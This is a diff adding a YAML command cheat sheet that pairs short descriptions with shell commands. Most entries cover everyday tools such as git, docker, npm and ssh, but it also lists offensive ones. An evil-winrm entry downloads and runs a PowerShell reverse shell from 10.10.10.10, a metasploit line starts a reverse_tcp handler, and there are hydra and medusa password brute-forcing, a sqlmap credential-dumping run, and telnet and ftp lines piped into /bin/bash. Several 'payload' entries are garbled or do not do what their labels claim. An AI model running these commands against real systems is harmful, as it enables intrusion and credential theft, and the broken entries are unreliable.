@@ -1,0 +1,182 @@
+dig:
+- Query a domain::dig domain.com
+- Query an IP address::dig @8.8.8.8 domain.com
+docker:
+- Run a Docker container::docker run -it ubuntu
+- Build a Docker image from a Dockerfile::docker build -t myimage .
+- Stop a running Docker container::docker stop container_name
+- Remove a Docker container::docker rm container_name
+- Remove a Docker image::docker rmi image_name
+- List Docker containers::docker ps -a
+- List Docker images::docker images
+- Inspect a Docker container::docker inspect container_name
+- Inspect a Docker image::docker inspect image_name
+- Run a Docker container in the background::docker run -d -it ubuntu
+docker-compose:
+- Run a Docker Compose command::docker-compose up
+- Stop a Docker Compose service::docker-compose stop service_name
+- Remove a Docker Compose service::docker-compose rm service_name
+- List Docker Compose services::docker-compose ps
+- Inspect a Docker Compose service::docker-compose inspect service_name
+- Build a Docker Compose service::docker-compose build
+evil-winrm:
+- Connect to a Windows host::evil-winrm -i 192.168.1.100 -u Administrator -p 'Pa55w0rd!'
+- Connect to a Windows host with a specific payload::evil-winrm -i 192.168.1.100 -u
+  Administrator -p 'Pa55w0rd!' -c 'powershell.exe -exec bypass -c "IEX (New-Object
+  Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp
+  -Reverse -IPAddress 10.10.10.10 -Port 4444 -Username administrator -Password Pa55w0rd!"'
+ftp:
+- Connect to a FTP server::ftp example.com
+- Connect to a FTP server with a specific payload::ftp example.com | /bin/bash -i
+git:
+- Clone a Git repository::git clone https://github.com/user/repo.git
+- Check the status of the Git repository::git status
+- Commit changes with a message::git commit -m 'Your commit message'
+- Push changes to a remote repository::git push origin branch_name
+- Pull changes from a remote repository::git pull origin branch_name
+- Create a new branch::git checkout -b branch_name
+- Switch to a different branch::git checkout branch_name
+- Merge a branch into the current branch::git merge branch_name
+- Delete a branch::git branch -d branch_name
+- Delete a remote branch::git push origin --delete branch_name
+- List all branches::git branch -a
+gobuster:
+- Scan a website::gobuster dir -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+- Scan a website with output::gobuster dir -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+  -o output.txt
+hping3:
+- Ping a domain::hping3 domain.com
+- Ping an IP address::hping3 192.168.1.1
+- retrieve system uptime hping3 --tcp-timestamp -S domain -p port
+hydra:
+- Login to a website::hydra -l username -P /path/to/passwords.txt -s 2222 https://example.com
+  https-post-form "/login:username=^USER^&password=^PASS^"
+- Login to a website with a specific payload::hydra -l username -P /path/to/passwords.txt
+  -s 2222 https://example.com https-post-form "/login:username=^USER^&password=^PASS^"
+  -V all
+ldap:
+- Connect to a LDAP server::ldapsearch -x -h example.com -D "cn=admin,dc=example,dc=com"
+  -w "password" -b "dc=example,dc=com"
+- Connect to a LDAP server with a specific payload::ldapsearch -x -h example.com -D
+  "cn=admin,dc=example,dc=com" -w "password" -b "dc=example,dc=com" -s base "(objectclass=*)"
+medusa:
+- Scan a website::medusa -h example.com -U /path/to/usernames.txt -P /path/to/passwords.txt
+  -M http
+- Scan a website with a specific payload::medusa -h example.com -U /path/to/usernames.txt
+  -P /path/to/passwords.txt -M http -T 10 -n 10 -t 10 -w 3 -I
+metasploit:
+- Start a Meterpreter session::msfconsole
+- Start a Meterpreter session with a specific payload::msfconsole -x 'use exploit/multi/handler;
+  set payload windows/meterpreter/reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444;
+  exploit -j -z'
+- List all available payloads::msfconsole -x 'show payloads'
+- List all available encoders::msfconsole -x 'show encoders'
+- List all available exploits::msfconsole -x 'show exploits'
+- List all available auxiliary modules::msfconsole -x 'show auxiliary'
+- List all available post modules::msfconsole -x 'show post'
+mongodb:
+- Connect to a MongoDB database::mongo example.com
+- 'Connect to a MongoDB database with a specific payload::mongo example.com --eval
+  "db.users.find({username: ''admin''}).pretty()"'
+mssql:
+- Connect to a MSSQL database::mssqlclient.py -windows auth example.com
+- Connect to a MSSQL database with a specific payload::mssqlclient.py -windows auth
+  example.com -sql "select * from users where username = 'admin'"
+mysql:
+- Connect to a MySQL database::mysql -u username -p
+- Connect to a MySQL database with a specific payload::mysql -u username -p -e 'select
+  * from users where username = "admin"'
+- List all databases::mysql -u username -p -e 'show databases;'
+- Create a new database::mysql -u username -p -e 'create database mydatabase;'
+- Drop a database::mysql -u username -p -e 'drop database mydatabase;'
+nfs:
+- Mount an NFS share::mount -t nfs example.com:/path/to/share /mnt/share
+- Mount an NFS share with a specific payload::mount -t nfs example.com:/path/to/share
+  /mnt/share -o nolock
+nikto:
+- Scan a website::nikto -host example.com
+- Scan a website with output::nikto -host example.com -output output.txt
+- Scan a website with output and save to a file::nikto -host example.com -output output.txt
+  > output.txt
+nmap:
+- Scan a network::nmap -sS 192.168.1.0/24
+- Scan a network with output::nmap -oX output.xml -sS 192.168.1.0/24
+- Scan a network with output and save to a file::nmap -oX output.xml -sS 192.168.1.0/24
+  > output.xml
+- Stealth scan a network::nmap -sS -sC -Pn 192.168.1.0/24
+- Stealth scan a network with output::nmap -oX output.xml -sS -sC -Pn 192.168.1.0/24
+npm:
+- Install a package::npm install package_name
+- Install a package globally::npm install -g package_name
+- Run a package::npm run script_name
+- Run a package with arguments::npm run script_name arg1 arg2
+nslookup:
+- Query a domain::nslookup domain.com
+- Query an IP address::nslookup 192.168.1.1
+postgresql:
+- Connect to a PostgreSQL database::psql -h example.com -U username
+- Connect to a PostgreSQL database with a specific payload::psql -h example.com -U
+  username -c "select * from users where username = 'admin'"
+- List all databases::psql -h example.com -U username -c "SELECT datname FROM pg_database;"
+- Create a new database::psql -h example.com -U username -c "CREATE DATABASE mydatabase;"
+- Drop a database::psql -h example.com -U username -c "DROP DATABASE mydatabase;"
+python:
+- Run a Python script::python script.py
+- Run a Python script with arguments::python script.py arg1 arg2
+redis:
+- Connect to a Redis database::redis-cli -h example.com
+- Connect to a Redis database with a specific payload::redis-cli -h example.com -a
+  "MYPASSWORD"
+- List all keys::redis-cli -h example.com keys *
+- Set a key::redis-cli -h example.com set mykey "myvalue"
+- Get a key::redis-cli -h example.com get mykey
+- Delete a key::redis-cli -h example.com del mykey
+smb:
+- Connect to a SMB server::smbclient -L example.com
+- Connect to a SMB server with a specific payload::smbclient -L example.com -U "MYUSER%MYPASSWORD"
+  -c "put /path/to/file.txt /path/to/destination"
+snmp:
+- Connect to a SNMP server::snmpwalk -v 2c -c public example.com
+- Connect to a SNMP server with a specific payload::snmpwalk -v 2c -c public example.com
+  -O q -m UCD-SNMP-MIB::sysDescr.0 -v 2c
+sqlmap:
+- Scan a website::sqlmap -u https://example.com --batch --crawl=2 --random-agent --level=5
+  --risk=3
+- Scan a website with output::sqlmap -u https://example.com --batch --crawl=2 --random-agent
+  --level=5 --risk=3 --output-dir output
+- Scan a website with output and save to a file::sqlmap -u https://example.com --batch
+  --crawl=2 --random-agent --level=5 --risk=3 --output-dir output > output.txt
+- Scan a website with a specific payload::sqlmap -u https://example.com --batch --crawl=2
+  --random-agent --level=5 --risk=3 --dbms=mysql --os=Linux --banner --is-dba --users
+  --passwords --current-user --dbs --tables --columns --dump --threads=10 --eta --time-based
+  --dns-resolve --dns-ttl --dbs --tables --columns --dump --output-dir output
+ssh:
+- Connect to a remote server::ssh user@example.com
+- Connect to a remote server with a specific port::ssh -p 2222 user@example.com
+- Connect to a remote server with a specific identity file::ssh -i /path/to/id_rsa
+  user@example.com
+- Connect to a remote server with a specific identity file and port::ssh -i /path/to/id_rsa
+  -p 2222 user@example.com
+- List all available SSH keys::ssh-add -l
+- generate a new SSH key::ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
+telnet:
+- Connect to a remote server::telnet example.com 22
+- Connect to a remote server with a specific payload::telnet example.com 22 | /bin/bash
+  -i
+tldr ls:
+- this is how to use tldr with a command::tldr ls
+traceroute:
+- Traceroute a domain::traceroute domain.com
+- Traceroute an IP address::traceroute 192.168.1.1
+whois:
+- Query a domain::whois domain.com
+- Query an IP address::whois 192.168.1.1
+- Query a specific whois server::whois -h whois.domain.com domain.com
+wpscan:
+- Scan a website::wpscan --url https://example.com --enumerate u1-20 --plugins-detection
+  aggressive --plugins-version-detection passive --no-color
+- Scan a website with output::wpscan --url https://example.com --enumerate u1-20 --plugins-detection
+  aggressive --plugins-version-detection passive --no-color --output-dir output
+- Scan a website with output and save to a file::wpscan --url https://example.com
+  --enumerate u1-20 --plugins-detection aggressive --plugins-version-detection passive
+  --no-color --output-dir output > output.txt
